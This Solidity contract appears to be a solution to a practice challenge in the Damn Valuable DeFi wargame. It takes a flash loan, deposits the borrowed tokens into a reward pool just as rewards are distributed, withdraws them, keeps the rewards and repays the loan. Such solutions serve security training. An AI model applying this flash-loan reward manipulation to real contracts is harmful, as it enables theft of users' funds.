// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";
import "hardhat/console.sol";

// todo : add access controll

contract AttackTheRewarder is Ownable {
    FlashLoanerPool public flashloanPool;
    TheRewarderPool public rewardPool;
    DamnValuableToken public liquidityToken;
    RewardToken public rewardToken;

    constructor(
        address _flashloanPool,
        address _rewardPool,
        address _liquidation,
        address _rewardToken
    ) {
        flashloanPool = FlashLoanerPool(_flashloanPool);
        rewardPool = TheRewarderPool(_rewardPool);
        liquidityToken = DamnValuableToken(_liquidation);
        rewardToken = RewardToken(_rewardToken);
    }

    function attack() external onlyOwner {
        // get liquidity token from flashloan
        uint256 amount = liquidityToken.balanceOf(address(flashloanPool));

        flashloanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashloanPool), "Not Flashloan Pool");
        //approve rewardPool first
        liquidityToken.approve(address(rewardPool), amount);

        // deposit to the pool
        rewardPool.deposit(amount);

        // call distributeRewards
        rewardPool.distributeRewards();

        // withdraw
        rewardPool.withdraw(amount);

        //transfer reward toke to admin
        uint256 rewardAmount = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner(), rewardAmount);

        // transfer back to flashloan
        liquidityToken.transfer(address(flashloanPool), amount);
    }
}
